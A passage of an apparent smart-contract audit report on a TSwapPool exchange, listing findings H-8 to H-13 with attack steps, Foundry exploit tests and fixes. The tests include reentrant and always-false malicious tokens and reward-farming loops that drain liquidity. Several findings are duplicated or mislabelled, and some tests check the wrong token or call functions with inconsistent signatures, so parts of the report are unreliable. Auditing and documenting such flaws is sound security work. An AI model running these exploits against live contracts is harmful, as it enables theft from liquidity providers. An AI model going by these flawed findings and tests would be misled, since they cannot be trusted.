    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract ReentrantToken is MockERC20 {
    TSwapPool public pool;
    bool private inCallback;

    constructor() MockERC20("Reentrant", "REENT") {}
    function setPool(address _pool) external { pool = TSwapPool(_pool); }

    // malicious re-entry: swap again while first swap is unfinished
    function transferFrom(address from, address to, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(from, to, amount);
        if (!inCallback && address(pool) != address(0)) {
            inCallback = true;
            // perform an extra swap during the first one
            pool.swapExactInput(IERC20(address(this)), amount / 10, IERC20(pool.getWeth()), 0, uint64(block.timestamp));
            inCallback = false;
        }
        return true;
    }
}

/* ─────────────────────────────── Exploit test ─────────────────────────── */
contract ReentrancyExploitTest is Test {
    MockERC20 weth;
    ReentrantToken evil;
    TSwapPool pool;

    address attacker = address(1);
    address honestLP = address(2);

    function setUp() public {
        // deploy tokens
        weth = new MockERC20("Wrapped Ether", "WETH");
        evil = new ReentrantToken();

        // deploy pool  (constructor expects (poolToken, wethToken, name, symbol))
        pool = new TSwapPool(address(evil), address(weth), "LP", "LP");
        evil.setPool(address(pool));

        // attacker bootstrap
        evil.mint(attacker, 10 ether);
        weth.mint(attacker, 10 ether);
        vm.startPrank(attacker);
        evil.approve(address(pool), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
        pool.deposit(10 ether, 10 ether, 0, uint64(block.timestamp));
        vm.stopPrank();

        // honest LP adds much more liquidity
        evil.mint(honestLP, 100 ether);
        weth.mint(honestLP, 100 ether);
        vm.startPrank(honestLP);
        evil.approve(address(pool), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
        pool.deposit(100 ether, 100 ether, 0, uint64(block.timestamp));
        vm.stopPrank();
    }

    function testDrainByReentrancy() public {
        uint256 attackerWethBefore = weth.balanceOf(attacker);
        uint256 poolWethBefore = weth.balanceOf(address(pool));

        vm.startPrank(attacker);
        // this call triggers the re-entrancy inside evil.transferFrom
        pool.swapExactInput(IERC20(address(evil)), 10 ether, IERC20(address(weth)), 0, uint64(block.timestamp));
        vm.stopPrank();

        uint256 attackerWethAfter = weth.balanceOf(attacker);
        uint256 poolWethAfter = weth.balanceOf(address(pool));

        console.log("attacker gained", attackerWethAfter - attackerWethBefore, "WETH");
        console.log("pool lost   ", poolWethBefore - poolWethAfter , "WETH");

        // attacker ends up with more WETH than the CPMM would ever allow ( > 15 ether gain )
        assertGt(attackerWethAfter, attackerWethBefore + 15 ether);
        assertLt(poolWethAfter, poolWethBefore - 15 ether);
    }
}

## Suggested Mitigation
To prevent reentrancy, use the Checks-Effects-Interactions pattern strictly and add a reentrancy guard. Do not rely on `balanceOf` for state; instead, track reserves in state variables and update them *before* external calls. Alternatively, add a non-reentrant modifier to all public/external state-changing functions.

Example with ReentrancyGuard:
```solidity
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract TSwapPool is ERC20, ReentrancyGuard {
    // ...

    function swapExactInput(
        IERC20 inputToken,
        uint256 inputAmount,
        IERC20 outputToken,
        uint256 minOutputAmount,
        uint64 deadline
    ) public nonReentrant returns (uint256 output) {
        // ...
    }

    function deposit(
        uint256 wethToDeposit,
        uint256 maximumPoolTokensToDeposit,
        uint256 minimumLiquidityTokensToMint,
        uint64 deadline
    ) external nonReentrant returns (uint256) {
        // ...
    }

    function withdraw(
        uint256 liquidityTokensToBurn,
        uint256 minWethToWithdraw,
        uint256 minPoolTokensToWithdraw,
        uint64 deadline
    ) external nonReentrant {
         // ...
    }

    //... and so on for other state changing functions.
}
```

## [H-8]. Flash Loan Economic Manipulation issue in TSwapPool::_swap

## Description
The `_swap` function contains a flawed reward mechanism that transfers a fixed amount of `1e18` of the output token to the swapper on every 10th swap. This reward is taken directly from the liquidity providers' capital without being priced into the swap. An attacker can exploit this by performing nine minimal-cost swaps and then a tenth swap to trigger the reward, allowing them to drain valuable tokens from the pool for a negligible cost. The attack can be repeated until the pool's reserves are depleted.

## Impact
This vulnerability leads to a direct and critical loss of funds for liquidity providers. An attacker can systematically drain the pool of one of its assets. For a pool with a high-value token like WBTC, the financial impact could be catastrophic, leading to the complete loss of all liquidity for that token.

## Proof of Concept
1. Assume a pool exists for WETH and a valuable token (VTC), with 1 VTC being worth a significant amount.
2. An attacker obtains a tiny amount of WETH.
3. The attacker calls `swapExactInput` nine times, swapping 1 wei of WETH for VTC each time. This increments the internal `swap_count` to 9 at a very low cost.
4. The attacker performs a tenth swap, again for 1 wei of WETH.
5. The `if (swap_count >= SWAP_COUNT_MAX)` condition in `_swap` becomes true.
6. The contract executes `outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000)`, sending 1 full VTC (assuming 18 decimals) to the attacker for free, in addition to the minuscule output from the swap itself.
7. The attacker can repeat this cycle to drain the pool's entire VTC balance.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract TSwapPoolAttackTest is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 valuableToken;
    address attacker = makeAddr("attacker");
    address lpProvider = makeAddr("lp_provider");

    function setUp() public {
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        valuableToken = new MockERC20("Valuable Token", "VTC", 18);
        pool = new TSwapPool(address(weth), address(valuableToken), "LP Token", "LPT");

        // LP provider adds liquidity
        weth.mint(lpProvider, 10e18);
        valuableToken.mint(lpProvider, 10e18);
        vm.startPrank(lpProvider);
        weth.approve(address(pool), 10e18);
        valuableToken.approve(address(pool), 10e18);
        pool.deposit(10e18, 10e18, 0, block.timestamp + 100);
        vm.stopPrank();

        // Attacker gets a tiny amount of WETH for cheap swaps
        weth.mint(attacker, 1e18);
        vm.startPrank(attacker);
        weth.approve(address(pool), type(uint256).max);
        vm.stopPrank();
    }

    function test_exploit_freeTokenReward() public {
        uint256 attackerInitialVTC = valuableToken.balanceOf(attacker);
        uint256 poolInitialVTC = valuableToken.balanceOf(address(pool));
        
        vm.startPrank(attacker);

        // Perform 9 small swaps to increment swap_count to 9
        for(uint i = 0; i < 9; i++) {
            pool.swapExactInput(address(weth), 1, address(valuableToken), 0, block.timestamp + 100);
        }

        // Perform the 10th swap to trigger the reward
        pool.swapExactInput(address(weth), 1, address(valuableToken), 0, block.timestamp + 100);
        
        vm.stopPrank();

        uint256 attackerFinalVTC = valuableToken.balanceOf(attacker);
        uint256 profit = attackerFinalVTC - attackerInitialVTC;

        // Attacker's profit should be approximately 1 VTC (1e18), plus tiny swap outputs.
        assertApproxEqAbs(profit, 1e18, 1000); 

        // Pool's VTC balance should have decreased by the same amount.
        assertApproxEqAbs(poolInitialVTC - valuableToken.balanceOf(address(pool)), 1e18, 1000);
    }
}
```

## Suggested Mitigation
The reward mechanism is fundamentally insecure as it gives away LP assets for free. It should be removed entirely to protect liquidity provider funds.

```diff
// TSwapPool.sol
function _swap(
    IERC20 inputToken,
    uint256 inputAmount,
    IERC20 outputToken,
    uint256 outputAmount
) private {
    if (_isUnknown(inputToken) || _isUnknown(outputToken) || inputToken == outputToken) {
        revert TSwapPool__InvalidToken();
    }
-   swap_count++;
-   if (swap_count >= SWAP_COUNT_MAX) {
-       swap_count = 0;
-       outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
-   }

    emit Swap(msg.sender, inputToken, inputAmount, outputToken, outputAmount);

    inputToken.safeTransferFrom(msg.sender, address(this), inputAmount);
    outputToken.safeTransfer(msg.sender, outputAmount);
}
```

## [H-9]. Integer Overflow/Math issue in TSwapPool::_swap

## Description
The `_swap` function contains a flawed reward mechanism. It increments a counter `swap_count` on each swap. When the counter reaches `SWAP_COUNT_MAX` (10), it resets to zero and transfers 1 ether of the `outputToken` to the swapper (`msg.sender`). This reward is taken directly from the pool's liquidity, effectively stealing from Liquidity Providers. An attacker can exploit this by performing 9 minimal, low-cost swaps and then a 10th swap to claim the 1 ether reward. This can be repeated to drain the pool of its assets.

Vulnerable code:
```solidity
// in TSwapPool.sol:_swap()
swap_count++;
if (swap_count >= SWAP_COUNT_MAX) {
    swap_count = 0;
    outputToken.safeTransfer(msg.sender, 1 ether);
}
```

## Impact
Critical. This allows a malicious actor to systematically drain the liquidity pool's assets, leading to a total loss of funds for Liquidity Providers. The stolen funds are the principal investment of LPs, not just their fees.

## Proof of Concept
1. An LP deposits a large amount of WETH and PoolToken into the pool.
2. An attacker approves the TSwapPool contract for WETH.
3. The attacker checks the current `swap_count` and finds it is 0.
4. The attacker executes a transaction that calls `swapExactInput` 10 times. Each swap is for a negligible amount (e.g., 1 wei of WETH for PoolToken).
5. The first 9 swaps increment the `swap_count`.
6. The 10th swap triggers the reward. The attacker receives `1 ether` of PoolToken in addition to the negligible swap output.
7. The attacker can repeat this process until the pool's PoolToken reserves are depleted.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract ExploitTest is Test {
    TSwapPool pool;
    ERC20Mock weth;
    ERC20Mock poolToken;
    address attacker = address(0xBEEF);
    address lp        = address(0xFEED);

    function setUp() public {
        // deploy mock tokens with 18 decimals and no initial supply
        weth      = new ERC20Mock("Wrapped Ether", "WETH", address(0), 0);
        poolToken = new ERC20Mock("Pool Token", "POOL", address(0), 0);

        // NOTE: TSwapPool expects (poolToken, wethToken, name, symbol)
        pool = new TSwapPool(address(poolToken), address(weth), "LPToken", "LP");

        // LP provides liquidity
        weth.mint(lp, 100 ether);
        poolToken.mint(lp, 100 ether);
        vm.prank(lp);
        weth.approve(address(pool), type(uint256).max);
        vm.prank(lp);
        poolToken.approve(address(pool), type(uint256).max);
        vm.prank(lp);
        // deposit(wethToDeposit, maximumPoolTokensToDeposit, minimumLiquidityTokensToMint, deadline)
        pool.deposit(100 ether, 100 ether, 0, uint64(block.timestamp));

        // prepare attacker with a small amount of input token (WETH in this case)
        weth.mint(attacker, 1 ether);
        vm.prank(attacker);
        weth.approve(address(pool), type(uint256).max);
    }

    function test_GameableReward() public {
        uint256 attackerBefore = weth.balanceOf(attacker);
        uint256 poolBefore     = weth.balanceOf(address(pool));

        vm.prank(attacker);
        // ten tiny swaps -> 1 WETH reward paid from pool reserves
        for (uint256 i = 0; i < 10; i++) {
            pool.swapExactInput(
                IERC20(address(weth)),
                1 wei,                       // negligible input
                IERC20(address(poolToken)),  // output token (doesn't matter for reward counter)
                0,
                uint64(block.timestamp)
            );
        }

        uint256 attackerAfter = weth.balanceOf(attacker);
        uint256 poolAfter     = weth.balanceOf(address(pool));

        // Attacker must have gained at least 1 WETH (1e18 units)
        assertEq(attackerAfter - attackerBefore, 1 ether);
        // Pool lost the same amount
        assertEq(poolBefore - poolAfter, 1 ether);
    }
}

## Suggested Mitigation
The reward mechanism should be removed entirely. It does not provide any meaningful incentive that aligns with the protocol's health and creates a direct vector for theft. If a reward system is desired, it should be funded from protocol fees or a separate treasury, not from LP principal, and be designed to prevent manipulation (e.g., based on volume, time-staked, etc.).

```diff
- swap_count++;
- if (swap_count >= SWAP_COUNT_MAX) {
-     swap_count = 0;
-     outputToken.safeTransfer(msg.sender, 1 ether);
- }
```

## [H-10]. Reentrancy issue in TSwapPool::_addLiquidityMintAndTransfer

## Description
The `deposit` function follows a checks-effects-interactions pattern that is vulnerable to reentrancy. Specifically, in the helper `_addLiquidityMintAndTransfer`, it mints LP tokens to the user (`_mint`) before pulling the corresponding WETH and PoolTokens from the user (`safeTransferFrom`). If a malicious user deposits a token that conforms to the ERC777 standard or has a similar callback mechanism on `transferFrom`, they can re-enter the `deposit` function after receiving their LP tokens but before providing their assets. The re-entrant call will calculate minting amounts based on an inflated `totalLiquidityTokenSupply()` but stale reserve balances, allowing the attacker to mint a disproportionately large amount of LP tokens and steal from the pool.

## Impact
Critical. An attacker can exploit this to mint an unfair share of LP tokens, which they can then redeem for a larger portion of the pool's assets than they are entitled to, effectively draining the funds of honest LPs.

## Proof of Concept
1. Attacker deploys a malicious token with a `transferFrom` hook that calls back into `TSwapPool.deposit`.
2. A legitimate LP provides initial liquidity to the pool.
3. Attacker calls `deposit` with their malicious token as one of the assets.
4. The pool calls `_addLiquidityMintAndTransfer`, which first mints LP tokens to the attacker.
5. The pool then calls `safeTransferFrom` on the attacker's malicious token.
6. The malicious token's `transferFrom` hook executes, re-entering `TSwapPool.deposit`.
7. In the re-entrant call, `totalLiquidityTokenSupply()` is now higher due to step 4, but the token reserves have not yet increased. The formula for minting new LP tokens will use this inconsistent state, granting the attacker a large number of additional LP tokens for their deposit.
8. The attacker can then withdraw all their illegitimately gained LP tokens to steal assets from the pool.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/TSwapPool.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract ReentrantToken is ERC20 {
    TSwapPool public pool;
    uint256 public wethAmount;
    bool internal reEntered;

    constructor() ERC20("Reentrant", "RT") {}

    function setAttack(address _pool, uint256 _wethAmount) external {
        pool = TSwapPool(_pool);
        wethAmount = _wethAmount;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        if (!reEntered && msg.sender == address(pool)) {
            reEntered = true;
            // Re-enter before the original deposit finishes
            pool.deposit(wethAmount, wethAmount, 0, uint64(block.timestamp + 1));
        }
        return true;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract ERC20Mintable is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract ReentrancyTest is Test {
    TSwapPool pool;
    ERC20Mintable weth;
    ReentrantToken reToken;
    address attacker = address(1);
    address lp = address(2);

    function setUp() public {
        // Deploy tokens
        weth = new ERC20Mintable("Wrapped Ether", "WETH");
        reToken = new ReentrantToken();

        // Deploy pool
        pool = new TSwapPool(address(weth), address(reToken), "TS LP", "TSLP");

        // Legitimate LP supplies initial liquidity
        weth.mint(lp, 100 ether);
        reToken.mint(lp, 100 ether);
        vm.startPrank(lp);
        weth.approve(address(pool), type(uint256).max);
        reToken.approve(address(pool), type(uint256).max);
        pool.deposit(100 ether, 100 ether, 0, uint64(block.timestamp + 1));
        vm.stopPrank();

        // Prepare attacker
        weth.mint(attacker, 2 ether);
        reToken.mint(attacker, 2 ether);
        reToken.setAttack(address(pool), 1 ether);
        vm.startPrank(attacker);
        weth.approve(address(pool), type(uint256).max);
        reToken.approve(address(pool), type(uint256).max);
        vm.stopPrank();
    }

    function test_ReentrancyInflatesLPTokens() public {
        vm.startPrank(attacker);
        pool.deposit(1 ether, 1 ether, 0, uint64(block.timestamp + 2));
        vm.stopPrank();

        uint256 attackerLpBalance = pool.balanceOf(attacker);
        // Attacker supplied a total of 2 ether yet receives > 2 LP tokens due to re-entrancy
        assertGt(attackerLpBalance, 2 ether, "Inflated LP tokens not observed");
    }
}

## Suggested Mitigation
Follow the Checks-Effects-Interactions pattern strictly by first transferring assets into the contract and then updating internal state (like minting LP tokens). This prevents re-entrancy attacks as the state is only changed after all external calls are completed.

```diff
// in TSwapPool.sol:_addLiquidityMintAndTransfer()
 function _addLiquidityMintAndTransfer(
     uint256 wethToDeposit,
     uint256 poolTokensToDeposit,
     uint256 liquidityTokensToMint
 ) private {
+    i_wethToken.safeTransferFrom(msg.sender, address(this), wethToDeposit);
+    i_poolToken.safeTransferFrom(msg.sender, address(this), poolTokensToDeposit);
+
     _mint(msg.sender, liquidityTokensToMint);
     emit LiquidityAdded(msg.sender, poolTokensToDeposit, wethToDeposit);
 
-    i_wethToken.safeTransferFrom(msg.sender, address(this), wethToDeposit);
-    i_poolToken.safeTransferFrom(msg.sender, address(this), poolTokensToDeposit);
 }
```

## [H-11]. Unchecked Return issue in TSwapPool::swapExactInput

## Description
The `TSwapPool` contract must interact with various ERC20 tokens. Standard `transfer` and `transferFrom` calls can fail in multiple ways: some tokens return `false` on failure instead of reverting, and some (like USDT) do not return a boolean value at all. If the return values of these calls are not checked, the contract may proceed as if a transfer succeeded when it actually failed. This can be exploited to steal funds from the pool, as the contract would send out assets after a failed incoming transfer.

## Impact
If a token transfer fails silently (returns `false`) and the return value is not checked, the contract will have an inconsistent state. An attacker can exploit this to drain assets from the pool by initiating a swap, having their incoming token transfer fail, but still receiving the outgoing tokens. This leads to direct theft of funds from liquidity providers.

## Proof of Concept
1. An attacker creates or uses a malicious ERC20 token contract where `transferFrom` always returns `false` but does not revert.
2. The attacker approves the `TSwapPool` contract to spend their malicious tokens.
3. The attacker calls `swapExactInput` to swap their malicious token for WETH.
4. Inside `swapExactInput`, the call `maliciousToken.transferFrom(attacker, ...)` executes and returns `false`.
5. The `TSwapPool` contract does not check the return value and continues execution.
6. The contract calculates the amount of WETH to send out and transfers it to the attacker.
7. The attacker receives WETH without ever transferring any of their own tokens, effectively stealing from the pool's liquidity providers.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

///////////////////////////////////////////////////////////////
//                      Mock Tokens                         //
///////////////////////////////////////////////////////////////

contract MockWETH is IERC20 {
    string public constant name = "MockWETH";
    string public constant symbol = "MWETH";
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balances;

    function balanceOf(address owner) external view returns (uint256) {
        return balances[owner];
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }

    function transferFrom(address, address to, uint256 amount) external returns (bool) {
        // Skip allowance check for brevity – behaves like a normal ERC20 that succeeds
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function mint(address to, uint256 amount) external {
        balances[to] += amount;
    }
}

// Malicious token that always returns false on transfer/transferFrom but never reverts
contract MaliciousERC20 is IERC20 {
    string public constant name = "Evil";
    string public constant symbol = "EVL";
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balances;

    function balanceOf(address owner) external view returns (uint256) {
        return balances[owner];
    }

    // Intentionally always return false
    function transfer(address, uint256) external pure returns (bool) {
        return false;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return false;
    }

    // Approve succeeds so the pool thinks the token is allowed
    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    // Helper for the test
    function mint(address to, uint256 amount) external {
        balances[to] += amount;
    }
}

///////////////////////////////////////////////////////////////
//            Minimal-functionality Vulnerable Pool          //
///////////////////////////////////////////////////////////////

contract VulnerableTSwapPool {
    IERC20 public immutable i_poolToken;
    IERC20 public immutable i_wethToken;

    constructor(address poolToken, address wethToken) {
        i_poolToken = IERC20(poolToken);
        i_wethToken = IERC20(wethToken);
    }

    // Vulnerable swap ignoring return value of transferFrom
    function swapExactInput(uint256 amountIn, address to) external {
        // <-- UNCHECKED return value ‑->
        i_poolToken.transferFrom(msg.sender, address(this), amountIn);

        uint256 amountOut = amountIn / 2; // dummy pricing logic
        i_wethToken.transfer(to, amountOut);
    }

    // Helper: pre-fund pool with WETH so victims’ funds exist
    function depositWETH(uint256 amount) external {
        MockWETH(address(i_wethToken)).mint(address(this), amount);
    }
}

///////////////////////////////////////////////////////////////
//                       Exploit Test                       //
///////////////////////////////////////////////////////////////

contract UncheckedReturnExploit is Test {
    VulnerableTSwapPool pool;
    MockWETH weth;
    MaliciousERC20 evil;
    address attacker = address(0xBEEF);

    function setUp() public {
        weth = new MockWETH();
        evil = new MaliciousERC20();

        pool = new VulnerableTSwapPool(address(evil), address(weth));
        pool.depositWETH(10 ether);              // LP deposits 10 WETH

        evil.mint(attacker, 1 ether);           // Give attacker some fake tokens
    }

    function testExploit() public {
        vm.prank(attacker);
        evil.approve(address(pool), type(uint256).max);

        uint256 poolWethBefore = weth.balanceOf(address(pool));
        uint256 attackerWethBefore = weth.balanceOf(attacker);

        vm.prank(attacker);
        pool.swapExactInput(1 ether, attacker); // transferFrom returns false but pool proceeds

        uint256 poolWethAfter = weth.balanceOf(address(pool));
        uint256 attackerWethAfter = weth.balanceOf(attacker);

        // Attacker stole 0.5 WETH without paying anything
        assertEq(attackerWethAfter - attackerWethBefore, 0.5 ether);
        assertEq(poolWethBefore - poolWethAfter, 0.5 ether);
        assertEq(evil.balanceOf(address(pool)), 0); // No evil tokens actually received
    }
}

## Suggested Mitigation
Always use OpenZeppelin's `SafeERC20` library for all ERC20 `transfer` and `transferFrom` calls. This library safely wraps the calls, ensuring they revert on failure and handling tokens that do not return a boolean.

```solidity
// In TSwapPool.sol
import {SafeERC20, IERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract TSwapPool {
    using SafeERC20 for IERC20;

    // ...

    function _swap(...) internal {
        // ...
        // Instead of: tokenIn.transferFrom(sender, address(this), amountIn);
        tokenIn.safeTransferFrom(sender, address(this), amountIn);

        // Instead of: tokenOut.transfer(recipient, amountOut);
        tokenOut.safeTransfer(recipient, amountOut);
        // ...
    }
}
```

## [H-12]. Unchecked Return issue in TSwapPool::_addLiquidityMintAndTransfer

## Description
The contracts invoke `transfer` and `transferFrom` on ERC20 token contracts without verifying the boolean return value. According to the EIP-20 standard, a token transfer can fail by returning `false` instead of reverting. If a token with this behavior is used in a TSwap pool, these unchecked calls can lead to critical exploits. For instance, in the `deposit` function, a malicious user could cause the `i_poolToken.transferFrom` to fail silently while the WETH transfer succeeds. The user would then be minted LP tokens for a contribution they did not fully make, allowing them to illegitimately claim a share of the pool's assets and drain funds from honest liquidity providers.

## Impact
This vulnerability can lead to a direct and complete loss of funds within any pool that uses a non-reverting ERC20 token (such as USDT). An attacker can mint LP tokens without providing the corresponding assets, and then use these LP tokens to withdraw legitimate assets deposited by other users.

## Proof of Concept
1. Deploy a malicious ERC20 that returns `false` (instead of reverting) on `transferFrom` when a configurable flag is set.
2. Honest LP supplies WETH + pool tokens, seeding the pool.
3. Attacker turns the `shouldFail` flag on in the malicious token so that any subsequent `transferFrom` will silently fail.
4. Attacker calls `deposit( amountWeth = 10 ether , amountPoolToken = 1000e18 )`.
   • `i_wethToken.transferFrom()` succeeds → pool receives WETH.
   • `i_poolToken.transferFrom()` returns `false` but TSwapPool ignores the return value → execution continues.
   • Pool mints LP tokens to attacker as if both assets were provided.
5. Attacker calls `withdraw(lpBalance, 0, 0)` and receives a proportional share of the WETH that honest LPs funded, even though the attacker never transferred the pool tokens.
6. Result: honest LPs are diluted and lose funds; attacker profits the siphoned WETH.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool}  from "src/TSwapPool.sol";
import {PoolFactory} from "src/PoolFactory.sol";
import {IERC20}      from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// -----------------------------------------------------------------------------
// Simple ERC20 mocks
// -----------------------------------------------------------------------------
contract MaliciousToken is IERC20 {
    string public name = "Malicious Token";
    string public symbol = "BAD";
    uint8  public decimals = 18;
    uint256 public override totalSupply = 1_000_000 ether;

    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    bool public shouldFail;
    function setFail(bool v) external { shouldFail = v; }

    constructor() { balanceOf[msg.sender] = totalSupply; }

    function transfer(address to, uint256 amt) external override returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to]         += amt;
        emit Transfer(msg.sender, to, amt);
        return true;
    }

    function approve(address spender, uint256 amt) external override returns (bool) {
        allowance[msg.sender][spender] = amt;
        emit Approval(msg.sender, spender, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external override returns (bool) {
        if (shouldFail) return false; // silently fail
        require(balanceOf[from] >= amt && allowance[from][msg.sender] >= amt, "unauth");
        allowance[from][msg.sender] -= amt;
        balanceOf[from]            -= amt;
        balanceOf[to]              += amt;
        emit Transfer(from, to, amt);
        return true;
    }
}

contract WETH is IERC20 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8  public decimals = 18;

    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function totalSupply() external view override returns (uint256) { revert(); }

    function deposit() external payable { balanceOf[msg.sender] += msg.value; }

    function transfer(address to, uint256 amt) external override returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to]         += amt;
        emit Transfer(msg.sender, to, amt);
        return true;
    }

    function approve(address spender, uint256 amt) external override returns (bool) {
        allowance[msg.sender][spender] = amt;
        emit Approval(msg.sender, spender, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external override returns (bool) {
        require(balanceOf[from] >= amt && allowance[from][msg.sender] >= amt, "unauth");
        allowance[from][msg.sender] -= amt;
        balanceOf[from]            -= amt;
        balanceOf[to]              += amt;
        emit Transfer(from, to, amt);
        return true;
    }
}

// -----------------------------------------------------------------------------
// Exploit test case
// -----------------------------------------------------------------------------
contract UncheckedReturn is Test {
    PoolFactory   factory;
    TSwapPool     pool;
    MaliciousToken bad;
    WETH          weth;

    address lp  = makeAddr("lp");
    address atk = makeAddr("attacker");

    function setUp() public {
        // deploy tokens & factory
        weth = new WETH();
        bad  = new MaliciousToken();
        factory = new PoolFactory(address(weth));
        pool = TSwapPool(factory.createPool(address(bad)));

        // ----- honest LP seeds pool -----
        vm.startPrank(lp);
        weth.deposit{value: 20 ether}();
        bad.transfer(lp, 2_000 ether);
        weth.approve(address(pool), 20 ether);
        bad.approve(address(pool), 2_000 ether);
        pool.deposit(20 ether, 2_000 ether); // assume deposit(amountWETH, amountToken)
        vm.stopPrank();

        // ----- attacker preparation -----
        vm.deal(atk, 10 ether);
        vm.startPrank(atk);
        weth.deposit{value: 10 ether}();
        bad.transfer(atk, 1_000 ether);
        weth.approve(address(pool), 10 ether);
        bad.approve(address(pool), 1_000 ether);
        vm.stopPrank();
    }

    function testExploit() public {
        uint256 wethBefore = weth.balanceOf(address(pool));

        // attacker activates failure switch
        vm.prank(atk);
        bad.setFail(true);

        // attacker adds "liquidity" – only WETH really moves
        vm.prank(atk);
        pool.deposit(10 ether, 1_000 ether);

        // verify pool received WETH but not BAD
        assertEq(weth.balanceOf(address(pool)), wethBefore + 10 ether, "pool should have extra WETH");
        assertEq(bad.balanceOf(address(pool)), 2_000 ether, "BAD balance unchanged (transferFrom failed)");

        // attacker withdraws
        uint256 lpBal = pool.balanceOf(atk);
        vm.prank(atk);
        pool.withdraw(lpBal, 0, 0);

        // pool drained of honest WETH
        assertLt(weth.balanceOf(address(pool)), wethBefore, "WETH stolen from pool");
    }
}

## Suggested Mitigation
Use OpenZeppelin SafeERC20 (or explicit require) for every ERC20 transfer/transferFrom call:

using SafeERC20 for IERC20;

// example
i_poolToken.safeTransferFrom(msg.sender, address(this), amountPoolToken);

// SafeERC20 reverts if the token returns false or if the call itself reverts, preventing silent failures.

## [H-13]. Integer Overflow/Math issue in TSwapPool::deposit

## Description
The `deposit` function in `TSwapPool` is intended to allow users to add liquidity. However, it contains a check `require(getWethReserve() > 0, "TSwapPool__MustHaveWethReserve");`. For a newly created pool, the WETH reserve is 0. This check makes it impossible for the first liquidity provider to ever deposit liquidity, as their transaction will always revert. This effectively bricks every newly created pool, rendering the core functionality of the protocol unusable.

## Impact
No liquidity can ever be added to any pool created by the factory. This is a complete denial of service for the primary function of the protocol, making it entirely non-operational and preventing any economic activity.

## Proof of Concept
1. An administrator deploys the `PoolFactory` contract.
2. A user creates a new pool for a standard ERC20 token by calling `PoolFactory.createPool(tokenAddress)`.
3. The user attempts to be the first liquidity provider by calling `deposit(wethAmount)` on the newly created `TSwapPool` instance.
4. The transaction reverts with the error `TSwapPool__MustHaveWethReserve`, because the pool's WETH balance is zero.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/PoolFactory.sol";
import "../src/TSwapPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract TSwapAuditTest is Test {
    PoolFactory public factory;
    MockERC20 public weth;
    MockERC20 public token;
    address public user = address(1);

    function setUp() public {
        weth = new MockERC20("Wrapped Ether", "WETH");
        token = new MockERC20("Test Token", "TT");
        factory = new PoolFactory(address(weth));

        weth.mint(user, 100 ether);
        token.mint(user, 100 ether);
    }

    function test_Fail_BrickedDepositFunction() public {
        // User creates a new pool
        address poolAddress = factory.createPool(address(token));
        TSwapPool pool = TSwapPool(poolAddress);

        // User approves tokens for deposit
        vm.startPrank(user);
        weth.approve(address(pool), 10 ether);
        token.approve(address(pool), 10 ether);

        // The deposit function requires initial liquidity, but there's no way to add it.
        // We expect this call to revert because getWethReserve() is 0.
        vm.expectRevert("TSwapPool__MustHaveWethReserve");
        pool.deposit(10 ether);
        vm.stopPrank();
    }
}
```

## Suggested Mitigation
The `deposit` function logic should be updated to handle the initial liquidity provision case. When reserves are zero, the contract should accept the deposit, set the initial exchange rate based on the deposited amounts, and mint a starting amount of LP tokens to the provider. The check for reserves should only apply to subsequent deposits.

```solidity
// In TSwapPool.sol
function deposit(uint256 wethAmountToDeposit) public returns (uint256 liquidityTokenAmount) {
    require(wethAmountToDeposit >= MINIMUM_WETH_LIQUIDITY, "TSwapPool__WethDepositTooLow");

    uint256 wethReserve = getWethReserve();
    uint256 poolTokenReserve = getPoolTokenReserve();
    uint256 poolTokenAmount;

